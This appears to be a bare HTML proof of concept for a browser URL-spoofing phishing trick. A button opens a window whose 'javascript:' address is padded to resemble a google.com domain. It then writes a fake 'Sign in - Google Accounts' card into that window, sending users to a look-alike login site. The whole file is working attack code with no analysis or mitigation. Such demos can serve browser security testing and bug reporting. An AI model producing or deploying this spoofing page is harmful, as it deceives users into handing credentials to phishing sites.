<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Demo</title>
</head>

<body>

<script>
function go() {
  var x = window.open('javascript:verylongurl.googlecloudplatform.accounts.google.com');

  setTimeout(function() {
    x.document.write(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">

        <meta
          name="viewport"
          content="width=device-width,
                   initial-scale=1.0,
                   maximum-scale=1.0,
                   user-scalable=no"
        >

        <style>
          * {
            box-sizing: border-box;
          }

          html,
          body {
            margin: 0;
            padding: 0;
            width: 100%;
            min-height: 100%;
          }

          body {
            min-height: 100vh;
            padding: 25px 20px 120px;

            font-family:
              -apple-system,
              BlinkMacSystemFont,
              "Segoe UI",
              Arial,
              sans-serif;

            background: #f7f8fc;
            color: #222;
          }

          .content {
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
            text-align: center;
          }

          .card {
            background: #fff;
            border-radius: 22px;
            padding: 28px 20px;

            box-shadow:
              0 8px 30px rgba(0, 0, 0, 0.08);
          }

          .title {
            font-size: clamp(22px, 6vw, 30px);
            line-height: 1.3;
            font-weight: 700;
            overflow-wrap: anywhere;
          }

          .message {
            margin-top: 14px;

            font-size: clamp(17px, 4.5vw, 21px);
            line-height: 1.5;

            color: #555;
            overflow-wrap: anywhere;
          }

          /* Same bottom image behavior as your original code */
          .bottom-image {
            position: fixed;
            bottom: 0;
            left: 0;

            max-width: 100%;
            height: auto;

            display: block;
          }

          @media (max-width: 360px) {
            body {
              padding-left: 14px;
              padding-right: 14px;
            }

            .card {
              padding: 24px 16px;
              border-radius: 18px;
            }
          }
        </style>
      </head>

      <body>

        <div class="content">
          <div class="card">

            <div class="title">
              Sign in - Google Accounts
            </div>

            <div class="message">
              For login, go to wwww.fake-gmail.com
            </div>

          </div>
        </div>

        <img
          class="bottom-image"
          src="a.jpg"
          alt=""
        >

      </body>
      </html>
    `);

    x.document.close();
  }, 100);
}
</script>

<input
  onclick="go()"
  value="Click here"
  type="button"
>

</body>
</html>
